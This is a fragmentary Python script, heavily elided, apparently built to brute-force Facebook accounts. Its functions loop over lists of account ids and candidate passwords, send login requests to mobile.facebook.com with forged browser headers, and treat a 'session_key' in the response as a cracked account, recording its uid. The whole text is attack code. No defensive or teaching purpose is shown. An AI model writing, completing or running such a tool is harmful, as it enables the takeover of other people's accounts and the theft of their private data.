...
def ffb(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        head = {'authority': 'mobile.facebook.com',
'method': 'GET',
...
'user-agent': ua}
                        getlog = session.get('https://mobile.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',)
...
def rndm(ids,passlist):
                try:
                        ...
                        for pas in passlist:
                                ...
                                po = requests.post('https://mobile.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
